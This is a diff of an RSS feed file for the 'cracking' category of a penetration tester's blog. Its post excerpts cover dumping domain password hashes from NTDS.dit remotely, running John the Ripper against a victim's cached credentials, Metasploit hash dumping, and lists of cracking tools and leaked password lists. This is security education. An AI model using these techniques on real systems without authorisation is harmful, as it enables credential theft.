-&lt;li&gt;hotmail: &lt;a href=&#34;http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm&#34;&gt;http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;rockyou: &lt;a href=&#34;http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/&#34;&gt;http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt; (Kevin&amp;rsquo;s Word Lists)&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.phenoelit-us.org/dpl/dpl.html&#34;&gt;http://www.phenoelit-us.org/dpl/dpl.html&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2&#34;&gt;http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.renderlab.net/projects/WPA-tables/&#34;&gt;http://www.renderlab.net/projects/WPA-tables/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>GPU Hash / Password Cracking</title>
-      <link>https://malicious.link/post/2009/2009-09-18-gpu-hash-password-cracking/</link>
-      <pubDate>Fri, 18 Sep 2009 01:44:39 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-09-18-gpu-hash-password-cracking/</guid>
-      <description>&lt;p&gt;I recently upgraded my video card and had a rough time finding programs that fit the hype of GPU password cracking, so here is what I found so that you won&amp;rsquo;t have as hard a time.&lt;/p&gt;
-&lt;p&gt;Ivan Golubev&amp;rsquo;s SHA1/MD5/MD4 cracker: &lt;a href=&#34;http://www.golubev.com/hashgpu.htm&#34;&gt;&lt;br&gt;
-http://www.golubev.com/hashgpu.htm&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Ivan Golubev&amp;rsquo;s RAR pass cracker:&lt;br&gt;
-&lt;a href=&#34;http://www.golubev.com/rargpu.htm&#34;&gt;http://www.golubev.com/rargpu.htm&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;CUDA Multiforcer (down at the time of this posting)&lt;br&gt;
-&lt;a href=&#34;http://www.cryptohaze.com/bruteforcers.php&#34;&gt;http://www.cryptohaze.com/bruteforcers.php&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;BarsWF - MD5 Cracker:&lt;br&gt;
-&lt;a href=&#34;http://3.14.by/en/md5&#34;&gt;http://3.14.by/en/md5&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;GPU MD5 Crack: (Included in BackTrack 4 repos &amp;ldquo;gpu-md5-crack&amp;rdquo;)&lt;br&gt;
-&lt;a href=&#34;http://bvernoux.free.fr/md5/index.php&#34;&gt;http://bvernoux.free.fr/md5/index.php&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Distributed Hash Cracker:&lt;br&gt;
-&lt;a href=&#34;http://rpisec.net/projects/show/hash-cracker&#34;&gt;http://rpisec.net/projects/show/hash-cracker&lt;/a&gt;&lt;br&gt;
-&amp;quot; This is an interesting one as it has a PHP front end and is agent based, so you can use one or a dozen computers, and it will use the CPUs and GPUs available&amp;quot;&lt;/p&gt;
-&lt;p&gt;Pentoo Live CD with a bunch of GPU cracking goodness built in:&lt;br&gt;
-&lt;a href=&#34;http://pentoo.blogspot.com/&#34;&gt;http://pentoo.blogspot.com/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Extreme GPU Bruteforcer (39.95 Euro)&lt;br&gt;
-&lt;a href=&#34;http://www.insidepro.com/eng/egb.shtml&#34;&gt;http://www.insidepro.com/eng/egb.shtml&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;ElcomSoft Distributed Password Recovery ($599 for 1st lvl - 20 hosts)&lt;br&gt;
-&lt;a href=&#34;http://www.elcomsoft.com/edpr.html&#34;&gt;http://www.elcomsoft.com/edpr.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;ax0n from &lt;a href=&#34;http://www.h-i-r.net/&#34;&gt;http://www.h-i-r.net/&lt;/a&gt; shot me an email stating that BT4 has some more GPU tools added to it:&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;Just FYI, BT4 also added some CUDA GPU cracking functionality a while&lt;br&gt;
-back ago. IIRC It includes Pyrit and CUDA-Multiforcer &amp;ndash; maybe a few&lt;br&gt;
-others. Pyrit is a cuda-enabled WPA-PSK cracker that you may also be&lt;br&gt;
-interested in.&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;Pyrit - WPA/PSK - WPA2/PSK GPU cracker&lt;br&gt;
-&lt;a href=&#34;http://code.google.com/p/pyrit/&#34;&gt;http://code.google.com/p/pyrit/&lt;/a&gt;&lt;/p&gt;
-</description>
-    </item>
-    
-  </channel>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>cracking - Category - Malicious Link - Blog by mubix - Rob Fuller</title>
+        <link>https://malicious.link/categories/cracking/</link>
+        <description>cracking - Category - Malicious Link - Blog by mubix - Rob Fuller</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>mubix@hak5.org (Rob Fuller)</managingEditor>
+            <webMaster>mubix@hak5.org (Rob Fuller)</webMaster><lastBuildDate>Tue, 11 Jun 2013 13:55:21 &#43;0000</lastBuildDate><atom:link href="https://malicious.link/categories/cracking/" rel="self" type="application/rss+xml" /><item>
+    <title>Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2</title>
+    <link>https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</link>
+    <pubDate>Tue, 11 Jun 2013 13:55:21 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</guid>
+    <description><![CDATA[Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:
+From: http://www.ntdsxtract.com/
+Download: http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+1 wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip From: http://code.google.com/p/libesedb/
+Download: https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
+1 wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz Extract the tools:
+1 2 tar zxvf libesedb-alpha-20120102.tar.gz unzip ntdsxtract_v1_0.zip Compile/make libesedb:
+1 2 3 root@wpad:~/blog/# cd libesedb-20120102 root@wpad:~/blog/libesedb-20120102# ./configure root@wpad:~/blog/libesedb-20120102# make Export the tables from NTDS.dit:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 root@wpad:~/blog/libesedb-20120102# cd esedbtools/ root@wpad:~/blog/libesedb-20120102/esedbtools# .]]></description>
+</item>
+<item>
+    <title>Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1</title>
+    <link>https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</link>
+    <pubDate>Mon, 10 Jun 2013 13:11:03 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</guid>
+    <description><![CDATA[This and part 2 are mostly just an update to http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.
+Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case.]]></description>
+</item>
+<item>
+    <title>Length Sorting Wordlists</title>
+    <link>https://malicious.link/posts/2013/2013-03-18-length-sorting-wordlists/</link>
+    <pubDate>Mon, 18 Mar 2013 20:01:44 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2013/2013-03-18-length-sorting-wordlists/</guid>
+    <description><![CDATA[This is one of those stupid simple things that are easy to forget so I&rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&rsquo;t have to, but there is times where it&rsquo;s important.
+Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits.]]></description>
+</item>
+<item>
+    <title>Intro to White Chapel</title>
+    <link>https://malicious.link/posts/2013/2013-01-19-intro-to-white-chapel/</link>
+    <pubDate>Sat, 19 Jan 2013 02:50:08 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2013/2013-01-19-intro-to-white-chapel/</guid>
+    <description><![CDATA[I made a slide deck to kind of explain my latest project. Basically I got fed up with having dictionaries, passwords, and cracking tools but no way to really do better collaboration in a team format as well as just better management for myself. Please feel free to submit pull requests, issues if you think something is broken or want features, or whatever on the Github repo here:
+https://github.com/mubix/WhiteChapel/
+Here is the slide deck:]]></description>
+</item>
+<item>
+    <title>lm2ntlm with John the Ripper</title>
+    <link>https://malicious.link/posts/2012/2012-10-24-lm2ntlm-with-john-the-ripper/</link>
+    <pubDate>Wed, 24 Oct 2012 15:03:58 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2012/2012-10-24-lm2ntlm-with-john-the-ripper/</guid>
+    <description><![CDATA[Since I didn&rsquo;t see any documentation bringing how to take an LM hash that you&rsquo;ve cracked and convert it to the NTLM equivalent all in one place. And I google how to do it almost every time. I wanted to put all these links in one place and remember how to do it for john. Go-go-gadget blog-notes.
+So there is this: https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp
+And this: https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb
+And this: http://www.securityfocus.com/tools/6696
+And the edited version of the above: http://atenlabs.]]></description>
+</item>
+<item>
+    <title>Multiple Dictionaries or Wordlists Using John the Ripper</title>
+    <link>https://malicious.link/posts/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</link>
+    <pubDate>Mon, 12 Sep 2011 08:09:46 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</guid>
+    <description><![CDATA[John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&rsquo;s stdin function but I like to run rules against my lists and I didn&rsquo;t see any how-tos on doing this. Here is my way:
+ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt
+This command will ls the &lsquo;dicts&rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I).]]></description>
+</item>
+<item>
+    <title>GPU Cracking Complaints</title>
+    <link>https://malicious.link/posts/2011/2011-07-13-gpu-cracking-complaints/</link>
+    <pubDate>Wed, 13 Jul 2011 14:02:13 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2011/2011-07-13-gpu-cracking-complaints/</guid>
+    <description><![CDATA[I&rsquo;ve been cracking passwords for a while and use a myriad of tools in a certain order to get the job done. I find that Cain is still my Go-to for allowing me to visualize the process and do some basic sorting (really wish I could search in-app). But I&rsquo;ve been asking around on twitter some questions like Why is GPU cracking for 50k hashes faster than Rainbow Tables (most say the bottleneck is the HDD read style and speed) and many asked what all of my compalints are so I figured this would be the best place (vice multiple emails)]]></description>
+</item>
+<item>
+    <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
+    <link>https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</link>
+    <pubDate>Mon, 16 May 2011 02:35:31 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
+    <description><![CDATA[When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:]]></description>
+</item>
+<item>
+    <title>Password / Word lists</title>
+    <link>https://malicious.link/posts/2009/2009-09-18-password-word-lists/</link>
+    <pubDate>Fri, 18 Sep 2009 14:41:16 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2009/2009-09-18-password-word-lists/</guid>
+    <description><![CDATA[Brute force, even though it&rsquo;s gotten so fast, is still a long way away from cracking long complex passwords. That&rsquo;s were word lists come in handy. It&rsquo;s usually the crackers first go-to solution, slam a word list against the hash, if that doesn&rsquo;t work, try rainbow tables (if they happen to have the tables for that specific hash type), and then the full on brute force. Some would say those first two steps are reversed, and it really is the choice of the the person doing it and the word lists they have to work with.]]></description>
+</item>
+<item>
+    <title>GPU Hash / Password Cracking</title>
+    <link>https://malicious.link/posts/2009/2009-09-18-gpu-hash-password-cracking/</link>
+    <pubDate>Fri, 18 Sep 2009 01:44:39 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2009/2009-09-18-gpu-hash-password-cracking/</guid>
+    <description><![CDATA[I recently upgraded my video card and had a rough time finding programs that fit the hype of GPU password cracking, so here is what I found so that you won&rsquo;t have as hard a time.
+Ivan Golubev&rsquo;s SHA1/MD5/MD4 cracker: http://www.golubev.com/hashgpu.htm
+Ivan Golubev&rsquo;s RAR pass cracker:
+http://www.golubev.com/rargpu.htm
+CUDA Multiforcer (down at the time of this posting)
+http://www.cryptohaze.com/bruteforcers.php
+BarsWF - MD5 Cracker:
+http://3.14.by/en/md5
+GPU MD5 Crack: (Included in BackTrack 4 repos &ldquo;gpu-md5-crack&rdquo;)]]></description>
+</item>
+</channel>
 </rss>
